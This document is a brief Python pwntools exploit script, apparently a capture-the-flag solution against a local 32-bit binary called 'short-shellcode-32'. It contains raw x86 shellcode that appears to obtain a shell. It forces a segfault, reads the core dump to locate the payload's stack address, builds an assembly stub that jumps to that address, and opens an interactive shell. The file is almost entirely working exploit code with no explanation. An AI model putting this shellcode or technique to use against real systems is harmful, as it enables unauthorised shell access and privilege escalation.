#! /usr/bin/env python
from pwn import *
from os import symlink, system

env = {
        'shell' : 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2QjA\x89\xe3j\x0bX\xcd\x80'
}

fname = './short-shellcode-32'
argv = [fname, env['shell']]
# FORCE segfualt
with open('shellcode.bin', 'wb') as f:
    f.write('ABCDEFG')
    f.close()

p = process(argv=argv)

if not os.path.exists('./core'):
    p.wait()

c = Core('./core')

addr_env = c.stack.find(env['shell'])
esp = 0x8048ac0
print(hex(addr_env))

dif = addr_env - esp
print(hex(dif))
temp = "\n#include <sys/syscall.h>\n.globl  main\n.type   main, @function\nmain:\n\tpush $0x%s\n\tret " % hex(addr_env)[-4:]

with open('shellcode.S', 'wb') as f:
    f.write(temp)
    f.close()

system("make 32")


p = process(argv=argv)
p.interactive()
